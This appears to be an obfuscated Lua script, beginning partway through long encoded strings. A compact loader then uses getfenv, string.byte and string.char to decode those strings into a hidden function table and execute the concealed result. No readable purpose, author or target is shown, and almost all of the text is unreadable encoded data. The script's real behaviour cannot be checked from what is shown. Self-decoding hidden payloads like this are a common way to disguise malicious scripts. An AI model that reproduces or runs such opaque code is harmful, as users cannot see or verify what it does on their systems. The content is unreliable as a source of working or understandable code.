-Ut{-AAN{%x6U6UAgL%Eg-L%Eh%U6NUEg-%-g6L{INU%Lx4gh6-EE4g4g-x%Ihtt6EU4I!B6g6xEIEx4-%L{I{%Nh8A4hhAUxUxtEt4-h-U6NUdIhtUmI-x{hU-EE4Uggg%ASLhx6Ix6tg-NUt%tg4{%tLtUgA{ttgt-g6{Ut4tIgx{-tAtLgN{It6tggh{Ltxt4gR{gtNtLN4U%xh%gNAAAEE4x66A6E{4N6xA44-U66{xA4t46L-{hEttEgI{ct{%htLhEI4E(tL6h{ExxLIt%N6{AIALt%xA-U6LEvALxE4A%gL%UtNhIIrE-tN6L6Ix%z6gUUA%LtEh4I%EgtE6At4xg%hIUhE6N-Exx--A66UEN%t4gZ-{AUUrNA4%Rx-2NLUx4gI4hLgL{%AAtU4LhG6{AEI6EL-thLA6U6AIIhdg-6AtLgIUv+x6{LA6t*NU;ExAUL{{LgE{4I5Lgx{hA-H6xAhE6UU{4Lt4--htg_E-Nx%tx6-thEU4xLI-9E-LhgL-E--t%AL6{EL4t6g6%N{xU-IAxxgt-gUUELNUeIg6%LLEELE-1IgxgAAEtE4ttY6ggENtL{ExItdUg{{{ILtUggh6gLNtIhxU-ghtgiE64SIExN-yALL{NgI{wI-LhxLhE--6_gUE{UA{VL4{%%gLELA{Ih4U-EgYULNUtN66-EUxLg4Ab7x6{LAgt N44Ixx6gLxtRx6IL%E66NEthE-xIh-hgAxI_EN_hhNhEEN4LtUOg{thNUUNN4%xtgghAL{xL-gG6UtNUAUEN4Gh6gxN8A.DUgghEgxUE46E4RAhxhxEtNU%LSL{xAEtUxg%I6g{hhLAIELxggx-IhUthE-%E}NhhNNNExAx66x6tEAA{a%Rg-{htttN{Ixxt-Uh{L{xwIL^{-x{EIttg4{%tLgE%AgtN4I6g6tEANEtNxS{H6ULI46tLgAgEAtEDN6%Ugx{IN%AAxE-UdIg{NtAERU-LWtU}NAtExU-P%6LUt6Nxt4r6{thNUUNN4%xtgghAL{xLIU6xgE{NItEN4hHtLt{NNAEExx%66tUEA4%LxxhghUEI46tLgt{UN6L-t%Ig%U{gN6tLNt%N6gUxAAAEE4x6{6g4UUA6Ex44%4AL{eA4tUOgU6hEU4E6%E6A6xhNUIINx-h%6g{-ALaLIx-hUth&IgIgg6-ALANHA6ihp--4AgExNht466ggAxEbN6%L6%{gLxtLNt%4ht6U{{Ata6x-0x6-UAA6tEx%%4Lw{x4UIgG-U6h-UIN6-6;-6%hgAUNt46%gg{NwAU4E4xhhUth1I6xxgt%NhA{ENxxEgtho66Eh46%Ug%ggh{LtxtI{Wx-thUL{E{-2MLg{hxAEatxg%{6tEg4%4gxN6%6-{t4AIExN-dA!UUEI%6xL{N{Ettt%-%6L-tAxt64x-EhUgI{{46I%gt-g6{Ut4g0tgt-N6UUNE%tt8g-Ah{tLNx%x3EgNNtA-4{%.&6U{A4I&EL4J%x6-EtA{tx4t%U6{U{40tx6L-xh-LLxLI4ggg{AItgx;4UgEUt{EI%xLIt%xUNAxIUtggg{gL6{LIAzh66%4hUU6Axt4x4{zhxtE4tt066{ILxEEx6IL6tLLUgA-tL-Q%4gE{4NhESxU%I6NEtAE%gxx-4AZU4NAt(6#-4{IUxtgILQCgx{-Ittg%U%EL%NLLtx,-E{L6{LhAUIE-U{LLt{w4gwA6ghIhxL-EL-LZ-gEhLLgE-4-htg6{-LEtUgL%x6-ULIx2I4xghU{UINx%hGU-{htttNg4AgR-6AhAUxL%txfU%{ItNxI4UhULg{AA-kLxU{gL6{LIt h-UhgLt{=4-%)_E-NhjtLE{IgQ{gIhLLxEh4-h6ggNEAUt{gL%{6%{L4Lt{Yh%UhE{pNLIUxNU6hENxEg%Ag?-6ALtgxSI4%I-xUgExxm-6RLUUUhIExhxL6ELIL6IA=%gIhh6-NEAAINxU-N{%UtEgIAs{ULNgU4xt-U%UgN{1Lgx%x66U6tN4IN/Il6hELLE6E6:Lgh{ILhLUNNI?6m-N{gUDNEINXNL6htLNEg4xhw6U{NAfVUghgg6NUhAct6gI-x64L6x6tE%%{L6tE4Ex%S}UUhAtUYx%446EUxNEA%EN-1%xLENtLvz6-I6xUEE6ALOE6Lggh-LL4dI4xE-4{hU1EUIIwNUthEIgEx44hPg4{ALY^ 44-IgxLgALtqxx--AtLgIUIE6%{L6tEn4E-L7{6hhUAE4U-L6t-dA1Axig%I%9Ug{%N6){g-{hhtNxIL%t9U{IA6LLAE)Axt6%htAU4gI4%gUtNUt%Et%U%6L%N(Itt-4I%6A6L%I4Ih%46N{DUgE-tx-E{x{gL-EL-L6gU!hIL{}6%Chg{I{vNhxExE6ULAU_IgxtgAh4LNUHEhyE<EhA6{A%4{4Ugg{t6)L4EN%%%gg{{tItE{4xStgU{{A{^_4L%{gxUE4tIgx{-tAgt%EExh%h-N{NtAEEINk5U:hUAIx6IL6E6ENtAgH%-LdtU4NhNU#EgU%I6{t6Ng%tdg-{httg4t%t^N-UhNA%Nt4gpAg{NLALxx4E%NLtU-t{x?46h{UtEfALtixx--AtU{NxttxU-{h{tHEL-L_xg-{LILE4%g%{UINgIktU%Eht6EE%ILEt-AhLh6EUNt%g6g{66LEAEg-6x4gUh6UxN4I46YgxNEttNl-66I{xAEI6EL-N{LhgU-NL&&x4%E64LhACIUxI-NAtUExgIxp4U+h4LAND-ZX46IhxNgEL4C%x6-EtNgxUxE{%LL{tIW:E6L-{{hUUEEsU6L{t6=t%4x-ggIgx{-ALyL4-%EgL{gA-t-gt%66-{ENU%Lxx--hLEx4I4{xN%xUgAtxh4UK{gtNtLgtA%Cv6UhUUILxtI3h-UNN{IIt,gU{g6AU-4LIU6g{66LEt4hlUgg{t6Gt6xJ4EoNgJNLA{Eg4{%IgL{xAht-g6%gLEUUN{%Lx{-%6LtLN{4hxUgE63LLEUINh6gELxAgxA%b06ULNgIDE4xITxhgAxI(*64L-NLxNANEt4d6U664LUN6txx4-4NLU_N4IU%gL6{EL4t6-EhA6LLxEhth%L{%hgU-NL%L4xghLt{B4-4g66g6AAE3N6%Ugx{INgtxEhI4h66gNxt=E6-Lh%UgAxILEt-x{thUU{Nt%68-%xh-LAN6IEO%-4AYUxxU4g%-L6{-LIE6g6%-h%{gNUEtx6-g6{EYNUxExx{hLt{c46>x6t-N{AUEExXE6t{Th6Aht--U6%g6UAA6tx%E%z6EE6IxxAx66x6tEAA{R%ng-{htttN{Ixxt-Uh{L{xHIL+{-x{EIttg4{%tLgE%t-44H6%A{yEANEtNx({s6ULI46tLgEgEAtLtx%%Lxt{xAgthxE-UlIg{E6AtBtxg%{6tEgLEExlhhtgGE-Eg%6gL%tL4LUEh%EqE-4{6tENhtxgIgL{%AAtU4Lhr6UAEAAnL4xhDg1EU4gxI4yghLNLEIUth4xhI6=Ah4E4EgUgEN6L6tA%x%xUx{gN%4E%{%%htL6N%4U%6-hhxA6t6tx-E-{hUUFIIIxggg%AVLUxLIL6xUEh4AUE6IxD4g4ELAxrL-4hNL{EUI%Igx{-tAtU{NxttxU-{h{tqN44g6tUL{{LgE{4IBLgx{hA-H6-x%L6%UANUtLg}%4UE{AAgtGxAg%hxUYxLIxgg{t6#t64x%%Vtgh{IAEEtg6>EU%{xA4^oxIhNh%ANt{4t4x-46ENUx6ttD6ggh{t NURE%hU-{AE-I4=6<U6{{gExZ64N%xLUUUAtt%xE{t6gNU4A%h5g-{htttNxI46 gIANNYEg U-%-xUELtEU-t(EUfUAI{4ExU6Ug:LNA{t6a-{U6LU8NxI-6tggLULEx%%LgAgEh#LhEx-z%U{E{xIhxE%I%x6-UL4Lt{?h-UhENUI/t6gL{-LhU4EII{%hgU{EtA4}I66LUgUgExxLIt6BUAAIA-tE4L%g6-U-4ttN-A-E64L64E%L6g{tA{t-44%x*xg-{Ltxxt-L%{gg{{AIEL4x%h6-E6ANlLxEhW6gELNt7 44{Lh6tgNtIhsIgEhtI6E6%%lxg4N=L44t%zh1gL{zAxt-gt%x64E(INxNx{{<6LUFNxI-6t-xh4tg4LtNgUg-NtL6Et4En4LL{4A%ENgL%LUgNLI{wL-LhgALUyN%%txx-4AjU4IN%66o-LhKLxE--t%6ghNVLNtgIqrEgN{N46tN4U%Nh%{tNgtAx{{L64EtNx%6xU{xhELNxtIgh6-t{6AgE{-smFgAU%AxEHgL%xUgE6ANYh-4-4LDUx4gGEgx{EAEENEN%t6L-UAEtgxU%x6.gxNgtExx-A6xLgAIA-tE4L%g6-U-4tIggU-EAUEUIAIEx9-hhxt*NJIA%%gxh!ILEx%g6N6NNtAExx-UhEUh{NNgE+4E%N6NEtN-%Ug1-xAhLU4x^{gggUAxAgE-4LhLUgN<LIE{g66aU%UgA{tt-%-g6{UtI%Igx{-tL%L{N-IE)E-ILALEN446gAgthIILE-4ErLgg{-A-wtxghtUxEgIttxgLhLLt{N46ILgt%xA6LU4x%L;EU6AgtLN{%Y%6ULhEIgtg4{%tU%U{A-tExE%IUAUEA4I6-A-E6TUhNx%3^L-AN6U4EUI6xx-4h4ILEx-L6EUxNLAEM6-6hLg{N^N6eL4EhThgEE46IUgFhxA6U-4tIv66-UAxLxE-4LgIgx{-AL0L4x%6gAUg46tUx{{LL6{-txtN66%th6LgN{%!xNggh6LEEEI6h6gU{{ILx%%-54LLhqALtU4N{66t{I4Lt-xE%L6gU-N-%tgUh4LAEh4%%-gx{{AtE44E%U6h{4N6tNxg%4hB6U{NAmxhxN%{6xUxN%xIxx--hLNIN^I%6t-{hxUtNUI{^{Uk{Ut+xg-U686gNtttxpI4hL6tN.AgnLxE{gLtUx4L_Ugt%NA6LL4ttx6UgUhNLX4hIU9N-Q{ULz#LIMP4gUUgtAtE4;%h6xEiNLtA66%4hUU6Axt4x4ULAgEN4h%%gI{4AEt-xL%N6UUgN%tNx)-{6xUNEtNgt{xth%hgU{Nt%t.g-{htttEgILxIgUNLLEEN-t6g{L{-ItE64t%Eg4ELAEtNgth-U{NgA4%L4J-LhUUNx6ItxIULh-LENLIg(-g-NtU4tAIE%x6g{{Atx%xg%LgIUU4LtExN{t6N{{Ig/h6L%=hLLUNN-6Qt-INLL-EEILTgg-{-ItEg-t%-UJ{NAEt6-P%gLENhNUtNxK{ hUUtN%IE6tg6hhtMNN4gx>-EhNLN76II%Ug6{UAEELxUKG6xUNAttxgL%%gEELAh4%6%gh{%L7Ix>E%6{gA%AL4x%tgv6LAxtt4}-I-g{xU-Lxt-xA%66EU%A4jJxx{66-EtNV%6xU{th{tUEg4-h6g-NtL6Et4E>4LL{-AEEL4g%-6-EtNgIAx--xhgULAIIUxx-4A3UUxLtC?LgUhNI6N44Uw6-xh4L4BL4xhB6U{tA%tEgt-ghA{{NxxExO{+hUUNN}%d!U-Nh}Ugxg4g,{gtNtAgE{4tht6g{{At:txg%LgIUU4LtExN{tL{NLN-%tx6-thEU4xLI-QE-t{gAgNt-tcxg4NZtLNN%U%-Lt{6AttE44{L6LU%NAIUxL{B64NENW*h_L-AN6U4EUI6xx-4h4ILE4IE.46hhiAUEI4NhtLU{cAAI%xx%)ALUxIgIUgz%xA6U44SI{66-4AxtLE--6DNUL{-Igxx%A%-L6NUIExh4N-ggS{EANtN66-EL%LgN{Itg%ggh{Lt4%4{s-gE{ELI4A4EG466AAA6EIxh-g66EtANxUxth%6tUhNIIExtU6hNEmE6%L}6hx64tt44-ggIg>{%ItE{4x!tgU{{A{yMx{%g6{UIALtxxh--A6ExNLI%zAgUhLt_NU%txNU6hLttEx%g%UU)hxI6E4-2%{L6{4IxlLx-{66NELN-%ggI{%AUE%NN%tgtUgLIL-EEIL)gg-{-I6tg-N%NLgNIItEtg--6LEEh46E4gN-6AgEIAxZhzU-NhXEhEUINZq{hhULNNO4U0jLLhDL4EUxg6A6E{8Ahtxg/%36AL%Nxtq6L-{LgLLIIILR%gA{ULLxb4L6t-NN6Ls4EINhLUNNxtAtt4I{L6-UEALtgx---AtL-AxI-cA-6hEL%N4%56Eg6hIAhtg46ht6gNLLEx#46hL6NAxNget4EhF6NEtN-!zxN{EA6U440I{66-4AxtA4I-ggIg{NLtLxx%A246U{6LxE444hp64E{NLlxgA{L6LE4AN%U6%{V6xt{Nd%x6AgEA%AgE{4t6%6g{{Atx%xg%{6tEtNgt{xt{thgU{Nt%t)g-{httg4t%{6-{4Ax';jFAtnsSKCVLbChFUmekSfzGSWYUktBLg={"),{=WU33U):k?Uk=.=wUd:{^.U)d?:W{,).ky)k3V:3Wwd?d.","yyW{WdVUW)):)w3w^3:w3^W^3=,?,3)3W=^w:?k::::V={{^yW?",")^kyVw,,:,U^.3U.y=UVw=Wy=y3)V,W{,)^)Uyd{^^{w=W,W^,Vk{dw).dk:{3U{:=,V=W","=k33{)U)ddyU.)k,{:=U)=yy.U,:wW^dywdVW{)V3:,d3y:{y{{W?,=?:3:w=3){?y{,VUdd,V=dd,:?dUwwU:{Uy):w:Vd,3V?WyVUy)?","Wk:dWd?W?w^V.{w,:W.?w3kk=WUd..{,^.).,k:3d:==d)kU,W,?.)dy)V:=U^:?V)=W3:yw{VW^VVU,Uww=,w",",?):U{)^dy)=W:3{.Uk.{?y3w:wUV^.,w.3wWV.V.3^wW^),.).^3?^U3=.WwykywW=VV))d:3","yw^,=Wd{WVU,?W{w)dy?^{^V3)3,)=k?,3U3:)W?w){V.3)==k,U,.3{k,.,kWy{=wW^:=.w.,U^V??U?","kky3k3W3.k:3^W{y:kV{U{=kd3y?yyUVW?W3.:y)=3?w3,,U:3^)^?Uk)V.UUU?{d,=kyy)..^d,y=V{:k),:dw3k3.=W3^UWd,k:d^WU{yU=){VV.kkd3d:{V)WVy{",".==Wy.Vk^.w3Wdk??W.WVW:^Vw..W::3)w,?)y?yU{?{yV^,","dy=Ww.W{d:,Vy{w.k^y{^)d^):^{dVy3^UU3?,))U){)U^y.yw{d3{Vy=k){U,yU.V?,=yUkVd,?kw^{U)w,UW3?d=W:dyW,,d?V?)Vw=UwW:?)?:d.^d,:y..?d","{U=:?,?=U.W:)?UWw)=kWUVV3y^WkwwW^)),:Wy{?y:w,?.=?V^{{y?^",",wy^){==V?:,?{=k^.w3,U:wwk=:?yV.?^wk^kVk,V.ywy.3V.yVwUWWk^?3,V3.?Uy=.?k)Wy=VW{VWyWwd?^=?{,?Wy),k^d{U,","yVyy.:{d?.:=:)^:{=yUk).yUkyk^V^U:^3)3V..=,^.yk.3U3=V=:yyU,3W)).)3:.VV.W,yV:3wk.,U:V:{Wy{V)d^V){U.k={3V=,.{^UWWk?w,3wWyy3^{:d..y):?U:.{3)V{)U{kw{k)WUk.V:k)U{.d?=,.Uw^=w,UwdV?Wd3=k,?d==yV{,V)Vw3?V.,?kw???)^=y{:d.=:??w{w,^Vy)?,=WUU=::dV^=wUwV,{wU,3^:k?kWV..y=?)yd3U3V^.{kWy3V)?{U^..:{WdU,{k3Udyk^V{V3{w:.wkkV,=k{^y3ywd,VVW{^)d.kVVyUUy^:3Vw:3W3=w,y)WV3d^)dVk^,^{{y.^?{:3.))VVWw=3y3U3^=V,ky3VyVw=Ww{k.U{WVU:k.U,Ukyww3yWd=.V3))w^.w=?WW:{U^{dW=yy))3{k.{.VVU)U)Ud3k)^)WVV:wV^,.U.yWk:{3V:=k.k3k)yww3)wd=d?yd)w,U3k?W?)dV^{{:{Vy)^=?=.{Vyd=)U:,V)k)=)k^V:3?^:.:))3W:{yUd.UU^.y{=^=V{UU),yUW^VW=)3dwkkV.^{k.V)y3)=ydV:==w)wwVWk=.3y.y?y^WW^U.k:?{yy,,,yVU)kW?yyV=W?,==)ydw^3w^),=WWy:,w3W?:UU=y)?:=:.3kdy)w:dkdw{^3).dky..y=U=WwW=.W:U:U.Udd.{d:3:U?wy::^?V,,??3:kV,,=.^:.U3)V,d.wWkV:.,.{W=k?k33==kWy^W.U^{dUUw=w??d^))?y.:^^)VUU:w{k^Uk,=kdkV{{:,dd,?,yd3{yWyUW.??wkd?^{?.w.dy=Vk^:V.U)UU^:{:,.yU)^UWwV^U?y?yw.{d=wk))?dkd?y:w^kyk=ky,.,dyy^d:d^w:,)Vwk{d==)V:,V3:.U).y3U{.dWVk..w,:ywkydUd={,WW)wUk=33Vy.3W^k=,{dy:d))3.Wyd?3y3wVUd?.)U.{=V^)W3V:k=3dw{VyU3.==,^.Vw^wk)y:{d?U^,^W?.k3W^.^^=3=^Uy,?{^3yV:.W3w.w3{{k{=?.^=?=w3)V::kVU{.V)yd.=?:33.)3kkV=^{d?.))y?{Wk)3kV{w3Uywd={=d,{dd:.^,w:,U^?k=3{wWyW{=?^yk):VUW?UdyW:dy){:V=^w{wy).U:k:).?y^dyV){d^^:k,d.,kW):=V?.=d.,,3Ud?y{d=dyV,,.=..){yUy,Vdk^UWyV=?d3wyd?k3?V),))kdk.k):=?Ww3.Uk:y?^{):V:kVyWww?d{{k.{.Uk.^3V={.^ky^.y,.?^,UWVUy,d3W:=,=){)w^)?w{^3dyyU:=wW){{==wdUdyU?^d=dyydU)U?^WW,V=:V:U.=wyd?U{?UW^W:Uy)d..Uw=)kydk{?y^kyy)V3VV.=)^k:.?3y:=.{,.Wyw^3.y.k{:k==d{:yyV)Wk.dU?,,:))^.V:V:d=?yV:dVky.y)^:Ww^3??d^w?,W)3:)y,yk:wyVd.yWkU.)dw.?k?V)3,ddV.Vyyyw=yU{y,Wd:U,,::,.,{=y^yU{,^::)kkdVd):3^3w{3,wVykU3=k=d=,=:yy:{:w..Vyd^=:V?=V=?UUV.y,^k^,U)^=U3yVW.y{==,V){^3{k3:=W{:,Vw3w3W,U=wU)3=:WW.Wy:?d)kdw=UW{.d3y^3.k.y.Vw{y::k.=kw=^y.k:dkUyw.^V^{w{wUdw)wk=^^w=V=yV?{Ud=yVy:dw)d?Uk.=3{,).wdU3:VUU{k:{Vw^UwkV=k:V.w:3{U=,33V=)VW)W:dUdkUW,kw),=y:=:)k.{y^Udww,W?,kyy.{,yU3.:=.^k{w^Uy,wk.d,.)3:.wk.,3k3k.?VW^y^d33WU^?^^U:UWdd.?{W.ywWw.w){:V^k.V{U:?y^y{):yVk.w.{WU).3d.).W^.w{wy:d3UUV:))3.:kk)3^d3w3k3y{={Wd,)V:3y^V){kk?Vk{d,U?.W3,:^V::3U^UyW.k:d,.kw)V{^33UyUwW:3wy),d)dyd.33)w.V3k=w.UV{U?w3{:yy?kw3?,)y=ddd,3kV.:.Ud:{k{^).d.kk=d.Ud.=.=UW={)))?,,kk)d=3Ww3V{?k=W{^,^d.dU3WUd.kd{?^Vy{dU?=W.w=3=w3.U,U,k:d.W{=Uyy=Wykyw.k?kW,=,=wk3w=V{)3yw)ky3.kV?d.W:kdyy=.,)..?wUd=:3.W^=3{?U=:)yk)k:){UVV.dV^V^yk)kyW^.,{V{dy3U:,)^)^{3yd^w:dyy{^)Uw)^,U)k=dWU=ywU:))yd^3^,Uy,wV^U{ww)^k^{?=.d=kW?w,Vw,,3?VdyU=w?3..?.U=?V^=kW:k?w)ww{V.Vd:^=yw:VW).:y^,^{W3W)yUW=,^k=?d:))y.,k:w^VU3,,d=V{w),V:k)W==Uw:k=??=W,.,,^W{kdWy^w.d,====3:VVyWy^3{=k.V,^^=.k3{Uy33kU{Wky:{:dUV=?)Ww^3wk=w?.d.U?:?.?yy.)W,V33,y{..w.w:kww.{,U,.Ukw:^^?k?==dU{,d={k,^Wy,ykW=,{{:V^,{k,UyWkV))V::k33yy{wVk..dwwy=:VU3k=3.{)dUU?,V:k3,V^:==?Ww?Uw^Vky)wk,?=?Vd3U3)w?V3d==d:?U.,yk:))VVy?)?^{U=yU?3::3=3V:3y:Vw.,3U=.?y{k^V)kUy:{V:UWkU)dW?V^y.w,U{?3U=w:,?)=wU:W?)d.Ud3d:,dU?=:=))WyU,3yUU,dV:=ky,==d.3?^=Vy3:),V^:kUV,kd.d^:)3,dU?=wy=:UU?yUkkyy3)?V?^d3,3=V3kUUVwwyU.{U^UV3d,d,d)VU)?WWd=kw)?,Vk:Vw?=y,).w3kW::=w{3.,=VwV),y3.k?3kyk.y=d.V?wk.Vwy=?U)kW^^U,W{wyV=k)^)yUw^VV^U3)),d.UVk?)3yy==y3?d^kyy{k)^)wdwV)V:):)wywUWyd.k,Ud?W={=:=:wyWykykUyk?U?{UWk:)dd^kk.y3k^^?y)U:.W,^=:yk,{::){{...?{=W?V.{dU^,.,,?3w{W)^:{U:^)wW.dkWk)Uyd{?,)V,d:WdUWU?:Ww,=)^=ww:)WU?^U^?yy={)??,wU3...Uy^yV:y^3w{dU=W?:dW,{w.y,W?w=3W,V,:=:,y=wy{{",""};return(function(f,...)local o;local h;local k;local b;local t;local l;local e=24915;local n=0;local d={};while n<231 do n=n+1;while n<0x100 and e%0x250c<0x1286 do n=n+1 e=(e+589)%2797 local r=n+e if(e%0x900)>0x480 then e=(e+0xd5)%0x59e0 while n<0x246 and e%0x24b2<0x1259 do n=n+1 e=(e*314)%25763 local b=n+e if(e%0x28d0)>=0x1468 then e=(e-0x3e5)%0x4742 local e=77585 if not d[e]then d[e]=0x1 l=string;end elseif e%2~=0 then e=(e*0x1db)%0x65ea local e=10779 if not d[e]then d[e]=0x1 t=function(t)local e=0x01 local function d(n)e=e+n return t:sub(e-n,e-0x01)end while true do local n=d(0x01)if(n=="\5")then break end local e=l.byte(d(0x01))local e=d(e)if n=="\2"then e=h.ibRQDpFa(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then o[e]=function(n,e)return f(8,nil,f,e,n)end elseif n=="\4"then e=o[e]elseif n=="\0"then e=o[e][d(l.byte(d(0x01)))];end local n=d(0x08)h[n]=e end end end else e=(e-0x2fc)%0x70d8 n=n+1 local e=5325 if not d[e]then d[e]=0x1 h={};end end end elseif e%2~=0 then e=(e-0x17b)%0x2c1a while n<0x99 and e%0x94e<0x4a7 do n=n+1 e=(e+52)%15329 local o=n+e if(e%0x23a2)<0x11d1 then e=(e+0x1f5)%0xb65e local e=72640 if not d[e]then d[e]=0x1 b="\4\8\116\111\110\117\109\98\101\114\105\98\82\81\68\112\70\97\0\6\115\116\114\105\110\103\4\99\104\97\114\68\97\89\100\121\95\106\74\0\6\115\116\114\105\110\103\3\115\117\98\89\99\69\87\73\98\95\87\0\6\115\116\114\105\110\103\4\98\121\116\101\121\69\74\106\118\73\75\83\0\5\116\97\98\108\101\6\99\111\110\99\97\116\122\83\73\113\75\90\88\79\0\5\116\97\98\108\101\6\105\110\115\101\114\116\82\119\86\118\83\79\71\81\5";end elseif e%2~=0 then e=(e+0x132)%0x712 local e=54616 if not d[e]then d[e]=0x1 end else e=(e*0x178)%0xbb3b n=n+1 local e=90112 if not d[e]then d[e]=0x1 end end end else e=(e-0x93)%0x665c n=n+1 while n<0x354 and e%0x3cd4<0x1e6a do n=n+1 e=(e*338)%33887 local t=n+e if(e%0x4762)<0x23b1 then e=(e*0x200)%0xba74 local e=9477 if not d[e]then d[e]=0x1 o=getfenv and getfenv();end elseif e%2~=0 then e=(e*0x3fa)%0xc139 local e=53600 if not d[e]then d[e]=0x1 k=tonumber;end else e=(e*0x93)%0x234b n=n+1 local e=87425 if not d[e]then d[e]=0x1 o=(not o)and _ENV or o;end end end end end e=(e-366)%44961 end t(b);local e={};for n=0x0,0xff do local d=h.DaYdy_jJ(n);e[n]=d;e[d]=n;end local function r(n)return e[n];end local l=(function(f,l)local b,d=0x01,0x10 local n={{},{},{}}local o=-0x01 local e=0x01 local t=f while true do n[0x03][h.YcEWIb_W(l,e,(function()e=b+e return e-0x01 end)())]=(function()o=o+0x01 return o end)()if o==(0x0f)then o=""d=0x000 break end end local o=#l while e<o+0x01 do n[0x02][d]=h.YcEWIb_W(l,e,(function()e=b+e return e-0x01 end)())d=d+0x01 if d%0x02==0x00 then d=0x00 h.RwVvSOGQ(n[0x01],(r((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+t)%0x100)));t=f+t;end end return h.zSIqKZXO(n[0x01])end);t(l(18,"h)oP#s-T;k, .y>uu4yuu >kyTlk.>   skk;#;%-oM-uP)N)TPs>y3 y-y> , .#7oy# sss.s,) o)7yusy#T,-k;;To-k---P-TP,Pk)so));kETuk>kpTuT,;ksu-sP sooTfs,-ks ;,sk),kkTTy-,s#PT#>#) .,..T k,,k#,ok>k.-,Tusuo,o-.4,uy).),;.. - skT-Ts##>P y-.s>-y# > y o.)ky,ETi-;-#>.yyuT>.y-.k #.Pk k,kkT.; #.-oy>.>u)yy.   >o.s.P,.- -;T-- >oy)>yyy.;>.y> -,, ;T)TPssu;>Tiku;>oDuy.u)y.,-,uko;s:>uu),5.u,>oy-uu>y  ,>,,TkTP-,bw>u)Puu>;YP7.>.>P P.HkTT.)-Cso#)-Ao)o)-i;>ky)y; s;+o.) P;ok),)kt)u>>o>T.Pyo,T#oP)s#P,o,#.os=-(!))yy.y us;#k--s2#TPsoPo)Lko>>P>).uyP o#,P,ss##PkoB#>Pu).>;yyuo.,.y#>Pys>#,P,s s#P,oku ukuo.s-#sPT#s>#>#>P;#PP-))oPQk>WT,- ;-T -os-Py#TP okPsooutyu>T-.skT;Tkk,s;-y#P#)owuu,-kP #.u..;ukKTosk-P#o>m.y>y)NU).y.,y).sk#,P),rTok##);o-ooA>uo k >s##)-#->TPsTPLo;o>);>o;>Tyk,; T,Ts;>sy#;PuouP)) ,#ko 6k.,#kuky-T;,T)P,Po.. ,yk.->.y).-.-T.Tu-ys.u#>oz7>y))B#u#ys..ks, ,#).6,ok)s# %s)P>Pyoyk ;,T##P#siP.o>)uokPku,>)yP y #,>#;P;sP#}P<)uoT)Tuku y>y# >k>#.P,s #-s,-###P J->>y>>sT#-oTuToku;;sPsu#,P {-ook.;k,y, k-k)kk-yToPuP,y-.#>Py#>s. ,.k.k.,,kATou>>.9yu.u;6su#.Pyyk>ko;so-)#Psoso oP)u)oyk>P ; ;#>P -OsuskPkP,PToo)Piu;;T-kk;#,uT);TsP#uo ) o- =k>.o,,y,,; P;u-r- P>PJy;.->-ysQj.),..#k;TuTk;)UB>>_>ukosM-Q)uoyk,#;>,+o;)-P-oUo-)Pok)#>>u- s Ts{P>s>#,-.--sk#,)n>uu.y>T;--;,T#;ss>Ty--P<)uPsok,_;u, k,;. P,s; T>su#o#,)o -,s.),>,o k T,kT>s>s*s>P-.u"));t(l(41,"3nK9}VJGapMgj!SC!Gg}Ca!LMVG9}CnCp9jMgKanVg{}n9gVM^anJS9}nVGSVJpaJK9GnpCRgjaKa9KnK9CVjSMGn}SC9n=M!ag}pn}29SnVjaMGJCJS9!Mjapj!MVGM}aK}C}JpMaG9V!K9CC!ppgp}9p}9H}jjpJKJ7n}nHjCJjn9VG9}KnMe}!9MSGS}MT9(9jSpMGKCJ!Vn9!jjKpKJn}G5gCVgppnGK}KKn5VMCMJGJVa9KSgG2}MGuVJKgn9SVgCVGJpnM-Mj}pMpjV}KjgGaS!appGaVMdVAVgaajVjV}n!SnGG}!VjJM}giS!}pGpCGMnSgJpn!}MJanVpKSCj!aMapfV9}HDgS}gKajJJ!sMjCKgJaSJC9CgGC!j!MJJS}GKJ!9!MppaG}!;!XKS0}SKGJ!9!nJ!SgGpJGg}SCG!jgKa^VSVKgSpJ!agnGCVg9anKSVgCGMVM} LJg!Vp9KGV}GKKCMjCp!Gp}pCg!!MMaCGSVCn}SSGG}!aCJa9JnKSCgJpaJS}Kn9CSMaaKFSSGKgC}!KMKGGVCKGS!S9pga!9!KnCJGMVVpVJ2}MnVapjnpSGa}CKpCSgMp9VMVnKSCK!G}g"));cIiGxgrwLfArkqS=function(e)e((h.uLKWMJXL+(function()local d,e=h.IyCsPjXl,h.MfvIa_YJ;(function(e)e(e(e))end)(function(n)if d>h.HWmRcQox then return n end d=d+h.MfvIa_YJ e=(e+h.FgOgOx_O)%h.__WVRGpu if(e%h.TbrRykHV)>=h.hduiKJVU then e=(e*h.CJkYnPZh)%h.WARcXyLt return n(n(n))else return n end return n end)return e;end)()))end;SqkrAfLwrgxGiIc={h.xdznpgjm,h.wsvZcraA};local e=(-h.rgwrCRry+(function()local o,e=h.IyCsPjXl,h.MfvIa_YJ;(function(n,e)e(e(e,e),e(n,n))end)(function(d,n)if o>h.fjTZzEYM then return n end o=o+h.MfvIa_YJ e=(e-h.sRyvRmbg)%h.qqQVdEQZ if(e%h._zluWv_V)>h.Xnre_xgD then return d(n(n,d and n),d(n,n))else return d end return n end,function(n,d)if o>h.ICRH_MnU then return d end o=o+h.MfvIa_YJ e=(e*h.fQDPsQSW)%h.ICzAQQgX if(e%h.rudBIpZo)<h.itlmQalQ then e=(e*h.FB_dQumV)%h.MSSqpPQk return n(d(n and n,n),d(n,n)and n(n and d,d))else return d end return n end)return e;end)())local he=(getfenv)or(function()return _ENV end);local r=h.yuGUTKRo or h.AqYp_Hfm;local o=h.ExHoWgXI;local b=h.apEXLEaR;local z=h.MfvIa_YJ;local t=h.hkIXqwXy;local function fe(y,...)local s=l(e,"e7^? b=SDoPCT.NF?C. CNPDo ST==b#?P^ UN7 ^^TNC=PADPS bN^DP7bT&DFz.PT PNoDD^STo= >^F7 FNND.- D?S7P7b= b??D^^LTF oNYyPPS7DDSbbT =?hD.SobL.PT^PTo=D(=Pb ^N=S7 FTN=.;CPP DNSD=^ N?=^y*PF .NTDFo.TD=S.bP  ^N7=.Po=DFD^=/Pbb?2 ToDCDP^oFTN TNCDP^DTS=DPDP? ^^6DF^.T^D^o}NNo=N=P ^^T7=FNV?ob??ohSN .=?DDS?7^?=7T?F=T.FDFT7S =D D?^7TZ bS^ oD.bPC7zDFPb=7^P7oFNND.^CP?C^D% F7b%?D^^ITF=Nq PFT.NDDSSbT =?&7DF7PCP FIPNo=Df=Pb ?N^D^=?TND.sCPP DNSD=^DPS=^^_PF .NTDC^7TTFCfbPS ^N7Dk^NPbDbD 